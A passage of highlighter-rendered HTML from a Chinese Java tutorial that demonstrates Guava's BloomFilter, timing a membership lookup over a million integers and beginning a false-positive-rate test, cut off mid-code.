}\r\n        long startTime = System.nanoTime(); // 获取开始时间\r\n        \r\n        //判断这一百万个数中是否包含29999这个数\r\n        if (bloomFilter.mightContain(29999)) {\r\n            System.out.println(\"命中了\");\r\n        }\r\n        long endTime = System.nanoTime();   // 获取结束时间\r\n\r\n        System.out.println(\"程序运行时间： \" + (endTime - startTime) + \"纳秒\");\r\n\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b06156663493-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b06156663493-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b06156663493-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b06156663493-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b06156663493-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b06156663493-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b06156663493-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b06156663493-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b06156663493-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b06156663493-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b06156663493-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b06156663493-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b06156663493-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b06156663493-27\">27</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-1\"><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b06156663493-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-3\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">google</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">common</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">hash</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b06156663493-4\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">google</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">common</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">hash</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Funnels</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-5\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nio</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">charset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Charset</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b06156663493-6\"> </div><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-7\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Test</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b06156663493-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000000</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b06156663493-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">Integer</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Funnels</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">integerFunnel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b06156663493-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b06156663493-14\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b06156663493-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">startTime</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nanoTime</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 获取开始时间</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-17\"><span class=\"crayon-h\">        </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b06156663493-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">//判断这一百万个数中是否包含29999这个数</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">29999</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b06156663493-20\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"命中了\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b06156663493-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">endTime</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nanoTime</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">   </span><span class=\"crayon-c\">// 获取结束时间</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b06156663493-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"程序运行时间： \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">endTime</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">startTime</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"纳秒\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-25\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b06156663493-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b06156663493-27\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0045 seconds] -->\r\n<p>输出如下所示</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe195b0a397990020\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n命中了\r\n程序运行时间： 219386纳秒</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0a397990020-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0a397990020-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe195b0a397990020-1\">命中了</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0a397990020-2\">程序运行时间：<span class=\"crayon-h\"> </span><span class=\"crayon-cn\">219386</span>纳秒</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>也就是说，判断一个数是否属于一个百万级别的集合，只要0.219ms就可以完成，性能极佳。</p>\n<h5 id=\"误判率的一些概念\">(3)误判率的一些概念</h5>\n<p>首先，我们先不对误判率做显示的设置，进行一个测试，代码如下所示</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe195b0e478434966\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npackage bloomfilter;\r\n\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\n\r\nimport com.google.common.hash.BloomFilter;\r\nimport com.google.common.hash.Funnels;\r\n\r\npublic class Test {\r\n    private static int size = 1000000;\r\n\r\n    private static BloomFilter&lt;Integer&gt; bloomFilter = BloomFilter.create(Funnels.integerFunnel(), size);\r\n\r\n    public static void main(String[] args) {\r\n        for (int i = 0; i &lt; size; i++) {\r\n            bloomFilter.put(i);\r\n        }\r\n        List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(1000);  \r\n        \r\n        //故意取10000个不在过滤器里的值，看看有多少个会被认为在过滤器里\r\n        for (int i = size + 10000; i &lt; size + 20000; i++) {  \r\n            if (bloomFilter.mightContain(i)) {  \r\n                list.add(i);  \r\n            }  \r\n        }  \r\n        System.out.println(\"误判的数量：\" + list.size()); \r\n\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b0e478434966-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b0e478434966-29\">29</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-1\"><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-3\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">ArrayList</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-4\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">List</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-6\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">google</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">common</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">hash</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-7\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">google</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">common</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">hash</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Funnels</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-8\"> </div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-9\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Test</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000000</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">Integer</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Funnels</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">integerFunnel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-16\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">List</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">Integer</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">list</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ArrayList</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">Integer</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-19\"><span class=\"crayon-h\">        </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">//故意取10000个不在过滤器里的值，看看有多少个会被认为在过滤器里</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> 